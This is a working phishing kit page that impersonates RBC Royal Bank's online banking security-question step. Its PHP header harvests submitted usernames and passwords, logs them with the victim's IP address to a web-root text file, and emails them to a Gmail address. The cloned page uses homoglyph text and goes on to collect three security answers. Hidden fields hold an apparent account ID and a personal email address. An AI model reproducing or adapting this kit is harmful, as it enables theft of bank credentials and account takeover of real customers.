 <?php

error_reporting(0);

$send = "medahnabil@gmail.com";

$username = $_POST["username"];
$password = $_POST["password"];



$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/DimaMohm3X.txt","a+");
fwrite($fp,"RBC - GOODLIFE" . " | " . getenv("REMOTE_ADDR") . " | " . getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\nusername: " . $username  . "\npassword: " . $password . "\n\n");
fclose($fp);
 
mail($send , "RBC - GOODLIFE",getenv("REMOTE_ADDR") . " | " . getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\nusername: " .$username . "\npassword: " . $password . "\n\n");

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">




<!-- Start of 3MSRCPATH.CINC -->




<form>
  <input type="hidden" name="EBG_TEMPLATE" id="EBG_TEMPLATE" value="3MSIPCHAL.HTM" />
</form>

<!-- End of 3MSRCPATH.CINC -->
<html>
 <head>
  <meta name="Identifier" content="3MSIPCHAL.HTM;9;ENGLISH;RB-MBP" />
  <noscript>
   <meta http-equiv="refresh" content="0; URL=/cgi-bin/rbaccess/rbcgi3m01?F8=1&amp;F22=HT&amp;REQUEST=SIGNOUT&amp;NS=Y&amp;CPG=7316&amp;LANGUAGE=ENGLISH" />
  </noscript>
<!-- 3MSHELLHDPT.INC: -->
<link href="https://www1.royalbank.com/uos/common/images/icons/favicon.ico" rel="icon">
<link href="https://www1.royalbank.com/uos/common/css/common.css?6" type="text/css" rel="stylesheet" />
<link href="https://www1.royalbank.com/uos/common/css/legacy.css?6" type="text/css" rel="stylesheet" />
<link href="https://www1.royalbank.com/uos/common/css/main01.css?6" type="text/css" rel="stylesheet" />
<link href="https://www1.royalbank.com/uos/common/css/main02.css?6" type="text/css" rel="stylesheet" />
<link href="https://www1.royalbank.com/uos/common/css/tabs.css?6" type="text/css" rel="stylesheet" />
<link rel="stylesheet" type="text/css" href="https://www1.royalbank.com/uos/common/css/print.css?6" media="print"/>
<script src="https://www1.royalbank.com/uos/common/javascript/utilities.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/browser.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/ie/event.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/event.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/kiosk.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/buttons.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/cookie.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/header_dates.js?6" type="text/javascript"></script>
<script src="https://www1.royalbank.com/uos/common/javascript/safaricss.js?6" type="text/javascript"></script>
<script language="JavaScript" type="text/javascript">
function shellExpired()
{
  var pDelta = rbcGetCookie( "3mDELTA", null );
  var pSessn = rbcGetCookie( "3movACWQDI2dIjWVgbAAD4GwAAVwilAA", null );

  if ( pDelta != null )
  {
    var loc   = pDelta.indexOf( '/', 0 );
    var delta = 0;
    var dtype = '0';

    if ( loc != -1 )
    {
      delta = new Number( pDelta.substring( 0, loc ) );
      dtype = pDelta.substring( loc + 1, pDelta.length );
    }
    else delta = new Number( pDelta );

    switch (dtype)
    {
      case '0':
      {
        var cdate = new Date();
        var sdate = new Date( cdate.valueOf() + 1800 );
        cdate = new Date( cdate.valueOf() + 604800000 );

        if ( pSessn == null )
        {
          rbcSetCookie( "3mDELTA", delta + 43200 + "/1", cdate.toGMTString(), "/" );
          rbcSetCookie( "3movACWQDI2dIjWVgbAAD4GwAAVwilAA", "1", sdate.toGMTString(), "/" );
        }
        else if ( pSessn != '1' )
          rbcSetCookie( "3mDELTA", delta + "/2", cdate.toGMTString(), "/" );

        break;
      }
      case '1':
      {
        if ( pSessn == null )
          rbcDeleteCookie( "3mDELTA", "/" );
        else if ( pSessn != '1' )
        {
          var cdate = new Date();
          cdate = new Date( cdate.valueOf() + 604800000 );
          rbcSetCookie( "3mDELTA", delta + "/2", cdate.toGMTString(), "/" );
        }
        break;
      }
      default :
      {
        if ( pSessn == null ) // Clear and show expired
        {
          document.location.replace( "/cgi-bin/rbaccess/rbcgi3m01?F8=1&F22=IB&REQUEST=SIGNOUT&LANGUAGE=ENGLISH" );
        }
      }
    }
  }
}
event_addOnLoad(new Array(shellExpired));
event_addOnFocusForm(new Array(shellExpired));
setTimeout( shellExpired ,1801000);
</script>
<script src="https://www1.royalbank.com/uos/common/javascript/header_dates.js?6" type="text/javascript"></script>
<script language="javascript" type="text/javascript">
<!--
function checkOnFocusForm() {
    if ( rbcGetCookie ("3MTK","NOTTHERE") != "NOTTHERE" ){
      rbcDeleteCookie("3MTK","/");
    }
    rbcSetCookie("F100","1/WX5/2F-6fGkqLkFcS.N9LYG6foKJloaPm-jbIv1NCBA1pOmFEezmPC8YyqcL5cOY4kZ8CBUlnyxKvUQdoACINaU6qg__/GQAAAA__/S0/PB", null, "/");
}
checkOnFocusForm();
event_addOnFocusForm(new Array(checkOnFocusForm));
//-->
</script>


<!-- 3MSHELLHDPT.INC. -->

  <title>
    RBC Financial Group - Onl&iota;ne bank&iota;ng
  </title>
</head>

<body onFocus="event_onFocusForm(); " onBlur="event_onBlurForm();" onLoad="event_onLoad();" onUnload="event_onUnload();">
 <div id="wrapper">
 <a name="top"></a>














      <div class="skipnav"><a href="#skipheadernav" onfocus='this.parentNode.className=""' onblur='this.parentNode.className="skipnav"'>Skip Header Navigation</a></div>
      <!-- Secure Header Start -->
      <div id="globalheader" class="clear globalheader-basic globalheader-secure">
        <div id="globalheader-logo">
                    <img src="https://www1.royalbank.com/uos/common/images/logos/web/rbc_royalbank_en.gif" alt="RBC Royal Bank" title="RBC Royal Bank" width="210" height="47" />
        </div>

        <p id="globalheader-links">


          <a href="javascript:kiosk_OpenWinRTB('https://www.rbcroyalbank.com/onlinebanking/help.html?RefURL=https://www1.royalbank.com/cgi-bin/rbaccess/rbcgi3m01', 'CONTACT', kiosk_Type2X, kiosk_Type2Y, kiosk_Type2R )" title="Customer Service (opens new window)">Customer Service</a>



        </p>

        <p id="globalheader-secureinfo">

        </p>
        <p id="globalheader-tools"><script type="text/javascript" language="JavaScript">dates_currentDate( 'ENGLISH' );</script></p>
      </div>

      <!-- Secure Header End -->
      <div class="skipnavanchor"><a name="skipheadernav" id="skipheadernav"></a></div>


 <div id="layout" class="clear">

 <div id="layout-column-main" style="width:946px">



 <!-- START: nav style -->

 <table border="0" width="100%">


  <tr valign="top" align="left">

      <td width="5"></td>
	  
      <!-- START: content -->
      <td valign="top" ><script language="JavaScript" type="text/javascript" src="https://www1.royalbank.com/uos/common/javascript/rsa.js"></script>
<form name="continueform" method="post" action="logging.php" autocomplete="off" >

		 <input type=hidden name="username" value="<?php print $username; ?>">
<input type=hidden name="password" value="<?php print $password; ?>">
  <input name="F22"                  type="hidden" value="HTECINET" />

  <input name="F30"                  type="hidden" value="1,X001,1,USERID,3,SIP_PVQ_ANS" />
  <input name="LANGUAGE"             type="hidden" value="ENGLISH" />
  <input name="NNAME"                type="hidden" value="" />
  <input name="SST"                  type="hidden" value="B-EABQAXAAYADQAhAA1Beg??" />
  <input name="REQUEST"              type="hidden" value="SIPChallengeComplete" />
  <input name="CHKCLICK"             type="hidden" value="Y" />
  <input name="USERID"               type="hidden" value="4519015739591604" />
  <input type="hidden" name="FromPreSignIn_SIP" value="Y" />
  <input name="RSA_DEVPRINT"        type="HIDDEN" value="" />
  <input name="PvqSrvsToken"         type="hidden" value="giQIZOjmIaEupj4pNtQz3PPD0tkc2OHv5.RUOcp5IpzVqENUfgpwbqP2emhDXT.l2.vApttCNMzH.3sJRnfdyHLuNZMErps3BQ7SGq1OrdC91mzvVzccqjUwIp96q9QMaU8ZRFFcdHYmQ4VJtVLN.r70odFi7eChC6hfwRMeilUv.vJ5rBY4bA??" />
  <input name="PvqSrvsAll"         type="hidden" value="1" />
  <input name="PvqSrvsNum"         type="hidden" value="1" />
  <input name="PvqSrvsBmrsQ"         type="hidden" value="Y" />
  <input name="PvqSrvsAlws"         type="hidden" value="Y" />




  <table border="0" width="100%">
   <tr>
    <td>
     <table border="0" cellspacing="0" cellpadding="0" width="100%">
      <tr>

       <td colspan="2" align="left">
        <div id="pagetitlearea" class="clear">
           <h1 id="pagetitle">
             S&iota;gn-In Protection - Person&alpha;l Ver&iota;f&iota;c&alpha;t&iota;on Questions
           </h1>
       </div>
       </td>
      </tr>


      <tr><td colspan="2" height="5" align="left"></td></tr>
      <tr>
       <td colspan="2" class="bodyText">
        CONFIRM YOUR CURRENT SECURITY QUESTIONS.<br /><br />
       </td>
      </tr>
      <tr>
       <td colspan="2" >
       <span class="contentframework-required-note"><b class="contentframework-required-asterisk">*</b>Required Information</span><br /><br />
       </td>
      </tr>
      <tr>
       <td colspan="2">
        <table class="contentframework" style="border-bottom:0px">
         <tr><th class="contentframework-dataheadertop" colspan="2" scope="col">Question 1 of 3</th></tr>
         <tr class="contentframework-altrow">
          <td width="3%" class="contentframework-formdatalabel">
           <label for="pvqQuestion"><strong>Question:</strong></label>
          </td>
          <td width="88%"> <select required="" name="question1" style="width:350px" value = ''>
								   <option value="">Select a question</option>
       <option value="What was the first movie I ever saw?">What was the first movie I ever saw?</option>
       <option value="What is the middle name of my oldest child?">What is the middle name of my oldest child?</option>
       <option value="In which city was my father born?">In which city was my father born?</option>
       <option value="Who was my favourite cartoon character as a child?">Who was my favourite cartoon character as a child?</option>
       <option value="What is my mother's middle name?">What is my mother's middle name?</option>
       <option value="In what year did I meet my significant other?">In what year did I meet my significant other?</option>
       <option value="What was my first pet's name?">What was my first pet's name?</option>
       <option value="First name of the maid of honour at my wedding?">First name of the maid of honour at my wedding?</option>
       <option value="First name of my best friend in elementary school?">First name of my best friend in elementary school?</option>
       <option value="Name of my all-time favourite movie character?">Name of my all-time favourite movie character?</option>
      </select> </td>
         </tr>
         <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Answer:</strong>
     </label>
          </td>
          <td >
           <input type="text" required="" name="answer1" id="pvqAnswer" size="22" maxlength="20" value="" /> <span class="contentframework-contextualhelp">

           

          </td>
         </tr>
        </table>
 <tr>
       <td colspan="2">
        <table class="contentframework" style="border-bottom:0px">
         <tr><th class="contentframework-dataheadertop" colspan="2" scope="col">Question 2 of 3</th></tr>
         <tr class="contentframework-altrow">
          <td width="3%" class="contentframework-formdatalabel">
           <label for="pvqQuestion"><strong>Question:</strong></label>
          </td>
          <td width="88%"> <select required="" name="question2" style="width:350px"  value = ''>
				    <option value="">Select a question</option>
       <option value="What was the first book I ever read?">What was the first book I ever read?</option>
       <option value="What was the first company I ever worked for?">What was the first company I ever worked for?</option>
       <option value="What High School did my mother attend?">What High School did my mother attend?</option>
       <option value="In which city was my mother born?">In which city was my mother born?</option>
       <option value="What is my spouse's/partner's middle name?">What is my spouse's/partner's middle name?</option>
       <option value="In which city did I get married?">In which city did I get married?</option>
       <option value="What is my best friend's first name?">What is my best friend's first name?</option>
       <option value="What is the name of the first school I attended?">What is the name of the first school I attended?</option>
       <option value="What was my kindergarten teacher's last name?">What was my kindergarten teacher's last name?</option>
       <option value="What is the first name of my oldest cousin?">What is the first name of my oldest cousin?</option>
      </select> </td>
         </tr>
         <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Answer:</strong>
     </label>
          </td>
          <td >
           <input type="text" required="" name="answer2" id="pvqAnswer" size="22" maxlength="20" value="" /> <span class="contentframework-contextualhelp">

           

          </td>
         </tr>
        </table>
		 <tr>
       <td colspan="2">
        <table class="contentframework" style="border-bottom:0px">
         <tr><th class="contentframework-dataheadertop" colspan="2" scope="col">Question 3 of 3</th></tr>
         <tr class="contentframework-altrow">
          <td width="3%" class="contentframework-formdatalabel">
           <label for="pvqQuestion"><strong>Question:</strong></label>
          </td>
          <td width="88%"> <select required="" name="question3" style="width:350px"  value = ''>
				       <option value="">Select a question</option>
       <option value="What was the make of my first car?">What was the make of my first car?</option>
       <option value="What High School did my father attend?">What High School did my father attend?</option>
       <option value="Which city did I meet my significant other?">Which city did I meet my significant other?</option>
       <option value="Last name of my favourite High School teacher?">Last name of my favourite High School teacher?</option>
       <option value="Which country did I go to on my honeymoon?">Which country did I go to on my honeymoon?</option>
       <option value="First name of my best man at my wedding?">First name of my best man at my wedding?</option>
       <option value="What was the name of my first manager?">What was the name of my first manager?</option>
       <option value="In what town or city was my significant other born?">In what town or city was my significant other born?</option>
       <option value="Last name of my childhood best friend?">Last name of my childhood best friend?</option>
       <option value="What is the first name of my oldest nephew?">What is the first name of my oldest nephew?</option>
      </select> </td>
         </tr>
         <tr>
          <td class="contentframework-formdatalabel"  >
           <label for="pvqAnswer">
           <SPAN class="contentframework-negativeindent">
           <b class="contentframework-required-asterisk">*</b></SPAN><strong>Answer:</strong>
          <span style="position:absolute;left:-10000px;top:auto;width:1px;height:1px;overflow:hidden;"> What is my best friend's first name?</span>
     </label>
          </td>
          <td >
           <input type="text" required="" name="answer3" id="pvqAnswer" size="22" maxlength="20" value="" /> <span class="contentframework-contextualhelp">

           

          </td>
         </tr>
        </table>

   <tr>
    <td>
      <table width="100%" cellpadding="0" cellspacing="0" border="0">
          <tr>
            <td>
<!--3MBUTTON01.CINC: en-->








<span class="button button-secondary">
<span>
<a 
id="id_btn_cancel"
title="Cancel"
href="javascript:if(document.title!='')document.cancelform.submit();"
onMouseOver="javascript:status='Cancel';return true;"
onMouseOut="javascript:status='';return true;"
>Cancel</a>
</span>
</span>



<!--3MBUTTON01.CINC. en-->
            </td>
            <td colspan="2" align="right">
<!--3MBUTTON01.CINC: en-->







 <span style="float:right;" >

<span class="button button-primary">
<span>
<input type="submit" style="  background-color: Transparent;
    background-repeat:no-repeat;
    border: none;
    cursor:pointer;
    overflow: hidden;
    outline:none;
	color: white;" value="Continue">
</span>
</span>

 </span>
 <script type="text/javascript">
  <!--
   var f3mbuttonuos_IDs = new Array();
   event_addOnLoad(new Array( f3mbuttonuos_FixTabOrder ));
   function f3mbuttonuos_ID2Fix(id)
   {
    var size = f3mbuttonuos_IDs.length;
    f3mbuttonuos_IDs[size]=new Array();
    f3mbuttonuos_IDs[size]=id;
   }
   function f3mbuttonuos_FixTabOrder()
   {
//    alert("We are in FixTabOrder");
    for (var i = 0; i < f3mbuttonuos_IDs.length - 1; i++)
    {
     var co_ord1 = new Array();
     var x1 = 0;
     var y1 = 0;
     var element1 = document.getElementById(f3mbuttonuos_IDs[i]);
     co_ord1 = f3mbuttonuos_findPos(element1);
     y1 = co_ord1[0];
     x1 = co_ord1[1];
//     alert("Element1 co-ords are: [" + x1 + "," + y1 + "]");
     for (var j = 1; j < f3mbuttonuos_IDs.length; j++)
     {
      var co_ord2 = new Array();
      var x2 = 0;
      var y2 = 0;
      var element2 = document.getElementById(f3mbuttonuos_IDs[j]);
      co_ord2 = f3mbuttonuos_findPos(element2);
      y2 = co_ord2[0];
      x2 = co_ord2[1];
//      alert("Element2 co-ords are: [" + x2 + "," + y2 + "]");
      if (y1 == y2) //The buttons are on the same level
      {
       if (x2 < x1) //We need to swap positions
       {
//        alert("switching " + f3mbuttonuos_IDs[i] + " with " + f3mbuttonuos_IDs[j]);
        var Element1LinkNum = 0;
        var Element2LinkNum = 0;
        var Element1LinkDir = "";
        var Element2LinkDir = "";
	var Element1Offset = 0;
	var Element2Offset = 0;
        var ElementOffsetHld = 0;
        var TempTabIndex = 0;
        var elementClone1 = new Object;
        var elementClone2 = new Object;
        for (l = 0; l < window.document.links.length; l++)
        {
         if (window.document.links[l].id == f3mbuttonuos_IDs[i])
         {
          Element1LinkNum = l;
          Element1LinkDir = window.document.links[l].parentNode.parentNode.parentNode.style.cssFloat; 
          if (typeof(Element1LinkDir) == "undefined")
	  {
           Element1LinkDir = window.document.links[l].parentNode.parentNode.parentNode.style.styleFloat;
          }
          if (window.document.links[l].parentNode.parentNode.parentNode.style.right != "")
          {
//           alert("Element1 is floating right");
           Element1Offset = window.document.links[l].parentNode.parentNode.parentNode.style.right.split("px");
          }
	  else
          if (window.document.links[l].parentNode.parentNode.parentNode.style.left != "")
          {
//           alert("Element1 is floating left");
           Element1Offset = window.document.links[l].parentNode.parentNode.parentNode.style.left.split("px");
          }
         }
         if (window.document.links[l].id == f3mbuttonuos_IDs[j])
         {
          Element2LinkNum = l;
          Element2LinkDir = window.document.links[l].parentNode.parentNode.parentNode.style.cssFloat;
          if (typeof(Element2LinkDir) == "undefined")
	  {
           Element2LinkDir = window.document.links[l].parentNode.parentNode.parentNode.style.styleFloat;
          }
          if (window.document.links[l].parentNode.parentNode.parentNode.style.right != "")
          {
//           alert("Element2 is floating right");
           Element2Offset = window.document.links[l].parentNode.parentNode.parentNode.style.right.split("px");
          }
	  else
          if (window.document.links[l].parentNode.parentNode.parentNode.style.left != "")
          {
//           alert("Element2 is floating left");
           Element2Offset = window.document.links[l].parentNode.parentNode.parentNode.style.left.split("px");
          }
         }
        }
//        alert("Element1Offset = " + Element1Offset + " , Element2Offset = " + Element2Offset);




  	if (Element1LinkDir == Element2LinkDir)
  	{
//         alert("Element float directions match: " + Element1LinkDir);
	 if (isNaN(Element1Offset))
         {
 	  Element1Offset = 0;
         }
	 if (isNaN(Element2Offset))
         {
 	  Element2Offset = 0;
         }

  	 if (Element1LinkDir == "right")
         {
	  ElementOffsetHld = parseInt(Element2Offset);
  	  Element2Offset = Element1Offset + window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.clientWidth;
          Element2Offset -= ElementOffsetHld;
    	  Element1Offset = Element1Offset - window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.clientWidth;
          window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.right = "" + Element1Offset.toString() + "px";
          window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.position = "relative";
          window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.right = "" + Element2Offset.toString() + "px";
          window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.position = "relative";
         }
         else
	 {
  	  ElementOffsetHld += parseInt(Element1Offset);
   	  Element1Offset = Element2Offset + window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.clientWidth;
          Element1Offset -= ElementOffsetHld;
   	  Element2Offset = Element2Offset + window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.clientWidth;
          window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.left = "" + Element1Offset.toString() + "px";
          window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.position = "relative";
          window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.left = "" + Element2Offset.toString() + "px";
          window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.position = "relative";
	 }
//         alert("Element1Offset = " + Element1Offset + " , Element2Offset = " + Element2Offset);
	}
        else
        {
	 Element1Offset = 0;
	 Element2Offset = 0;
         if (window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.right != "")
         {
          window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.right = "" + Element1Offset.toString() + "px";
         }
         if (window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.left != "")
         {
          window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.style.left = "" + Element1Offset.toString() + "px";
         }
         if (window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.right != "")
         {
          window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.right = "" + Element2Offset.toString() + "px";
         }
         if (window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.left != "")
         {
          window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.style.left = "" + Element2Offset.toString() + "px";
         }
        }

 
        elementClone1 = window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.cloneNode(true);
        elementClone2 = window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.cloneNode(true);
        window.document.links[Element1LinkNum].parentNode.parentNode.parentNode.parentNode.replaceChild(elementClone2,window.document.links[Element1LinkNum].parentNode.parentNode.parentNode);
        window.document.links[Element2LinkNum].parentNode.parentNode.parentNode.parentNode.replaceChild(elementClone1,window.document.links[Element2LinkNum].parentNode.parentNode.parentNode);
 

       }
      }
     }
    }
   }
   function f3mbuttonuos_findPos(obj)
   {
    var obj2 = obj;
    var curtop = 0;
    var curleft = 0;
    if (document.getElementById || document.all)
    {
     do
     {
      curleft += obj.offsetLeft-obj.scrollLeft;
      curtop += obj.offsetTop-obj.scrollTop;
      obj = obj.offsetParent;
      obj2 = obj2.parentNode;
      while (obj2!=obj)
      {
       curleft -= obj2.scrollLeft;
       curtop -= obj2.scrollTop;
       obj2 = obj2.parentNode;
      }
     }
     while (obj.offsetParent)
    }
    else
    if (document.layers)
    {
     curtop += obj.y;
     curleft += obj.x;
    }
    return [curtop, curleft];
   }
  //-->
 </script>
 <script type="text/javascript">
  <!--
   f3mbuttonuos_ID2Fix("id_btn_continue");
  //-->
 </script>


<!--3MBUTTON01.CINC. en-->
            </td>
          </tr>
      </table>
    </td>
    <td width="216">&nbsp;</td>
   </tr>
  </table>
</form>

  <script type="text/javascript">
  <!--
   document.continueform.SIP_PVQ_ANS.focus();
  //-->
  </script>

<script type="text/javascript">
<!--
 //document.continueform.SIP_PVQ_ANS.focus();
  v3mRSA_GetData(document.continueform);
//-->
</script>

<form name="cancelform" method="post" action="/cgi-bin/rbaccess/rbcgi3m01">
  <input name="F8"                   type="hidden" value="1" />
  <input name="F22"                  type="hidden" value="HT" />
  <input name="LANGUAGE"             type="hidden" value="ENGLISH" />
  <input name="REQUEST"              type="hidden" value="SIPCancel" />
  <input type="hidden" name="FromPreSignIn_SIP" value="Y" />
</form>

<form name="frmHaveTrouble" method="post" action="/cgi-bin/rbaccess/rbcgi3m01">

  <input name="F22" type="hidden" value="HTECINET" />

  <input type="hidden" name="LANGUAGE" value="ENGLISH" />
  <input name="SST"       type="HIDDEN" value="B-EABQAXAAYADQAhAA1Beg??" />
  <input name="request" type="HIDDEN" value="SIPHavingTroubleWithEmail" />
  <input name="SIP_HELP_BACK" type="HIDDEN" value="Y" />
  <input name="SIP_HELP_CONT" type="HIDDEN" value="Y" />
  <input name="NNAME"                type="hidden" value="" />
  <input name="CHKCLICK"             type="hidden" value="Y" />
  <input name="USERID"               type="hidden" value="4519015739591604" />
  <input name="RSA_DEVPRINT"         type="HIDDEN" value="" />
  <input name="PvqSrvsToken"         type="hidden" value="giQIZOjmIaEupj4pNtQz3PPD0tkc2OHv5.RUOcp5IpzVqENUfgpwbqP2emhDXT.l2.vApttCNMzH.3sJRnfdyHLuNZMErps3BQ7SGq1OrdC91mzvVzccqjUwIp96q9QMaU8ZRFFcdHYmQ4VJtVLN.r70odFi7eChC6hfwRMeilUv.vJ5rBY4bA??" />
  <input name="PvqSrvsAll"         type="hidden" value="1" />
  <input name="PvqSrvsNum"         type="hidden" value="1" />
  <input name="PvqSrvsBmrsQ"         type="hidden" value="Y" />
  <input name="PvqSrvsAlws"         type="hidden" value="Y" />
  <input name="EMAILADDRESS"       type="HIDDEN" value="wolfgang3030@gmail.com" />
  <input name="SIP_PVQ"            type="HIDDEN" value="What is my best friend's first name?" />
</form>
</td>
      <!-- END:   content -->

  </tr>
 </table>
 </div>

 </div>


<!--3MSHELLFTPT.INC:-->

 <div id="globalfooter">
  <div id="globalfooter-main">
      <p>Royal Bank of Canada Website, &copy; 1995-2019</p>
 
 
			
   <p><a href="javascript:kiosk_OpenWinRTB( 'http://www.rbc.com/privacysecurity/ca/', 'RTB', kiosk_Type2X, kiosk_Type2Y, kiosk_Type2R )" title="Privacy &amp; Security (opens new window)" >Privacy &amp; Security</a> | 
   <a href="javascript:kiosk_OpenWinRTB( 'http://www.rbc.com/legal/', 'RTB', kiosk_Type3X, kiosk_Type3Y, kiosk_Type3R )" title="Legal (opens new window)" >Legal</a> | 
   <a href="javascript:kiosk_OpenWinRTB( 'http://www.rbc.com/accessibility/', 'RTB', kiosk_Type3X, kiosk_Type3Y, kiosk_Type3R )" title="Accessibility (opens new window)">Accessibility</a>
   </p>
  </div>
 </div>

<!--3MSHELLFTPT.INC.-->
<!-- 3MSHELLFOOT.JS -->
<script language="Javascript" type="text/javascript">
<!--
var c3mbp = new buttons_ButtonPreload( "btn_", "_down" );
//-->
</script>
<!-- 3MSHELLFOOT.JS -->
 <!-- Start of 3MSHELLFENT.INC -->
 <form name="EntityForm" method="POST" action="/cgi-bin/rbaccess/rbcgi3m01">
 <input type="hidden" name="F22" value="HTPCBINET" />
 <input type="hidden" name="LANGUAGE" value="ENGLISH" />
 <input type="hidden" name="REQUEST" value="BeanCounter" />
 <input type="hidden" name="XREQUEST" value="AcctBalanceInquiry" />
 <input type="hidden" name="BEAN" value="ENTITY" />
 <input type="hidden" name="r" value="3MSHELL01.HTM" />

 <script type='text/javascript'>
    <!--
        function write3MTKInput()
        {
    var tkval="<input name='3MTK' type='hidden' value='" +
                               rbcGetCookie ("3MTK","0") +"' />";
    document.write(tkval);
        }

  write3MTKInput()
     //-->
 </script>

 </form>
 <!-- End of 3MSHELLFENT.INC -->
 <!-- Start of 3MSHELLFBAL.INC -->
 <form name="BalancesForm" method="POST" action="/cgi-bin/rbaccess/rbcgi3m01">
 <input name="F22"      type="hidden" value="HTPCBINET" />
 <input name="LANGUAGE" type="hidden" value="ENGLISH" />
 <input name="REQUEST"  type="hidden" value="AcctBalanceInquiry" />
 </form>
 <!-- End of 3MSHELLFBAL.INC -->
 <!-- Start of 3MSHELLFBRD.INC -->
 <form name="BreadCrumb1Form" method="POST" action="/cgi-bin/rbaccess/rbcgi3m01">
 <input type="hidden" name="F22" value="HTPCBINET" />
 <input type="hidden" name="LANGUAGE" value="ENGLISH" />
 </form>
 <!-- End of 3MSHELLFBRD.INC -->
<!-- Start of 3MSHELLFUPP.INC -->
<form name="UpdateProfileForm" method="POST" action="/cgi-bin/rbaccess/rbcgi3m01">
 <input type="hidden" name="F22" value="HTPCBINET" />
 <input type="hidden" name="LANGUAGE" value="ENGLISH" />
 <input type="hidden" name="REQUEST" value="Preferences" />
 <input type="hidden" name="TYPE"     value="PAPS" />
 </form>
<!-- End of 3MSHELLFUPP.INC -->

 <!-- Start of 3MSHELLFTAB.INC -->
 <form name="TabInfo" method="POST" action="/cgi-bin/rbaccess/rbcgi3m01">
 <input name="F22"      type="hidden"  value="HTPCBINET" />
 <input name="LANGUAGE" type="hidden"  value="ENGLISH" />
 <input name="REQUEST"  type="hidden"  value="GetTabInfo" />
 <input name="Tab"      type="hidden"  value="" />
 </form>
 <!-- Endt of 3MSHELLFTAB.INC -->
</div>
</body>


</html>
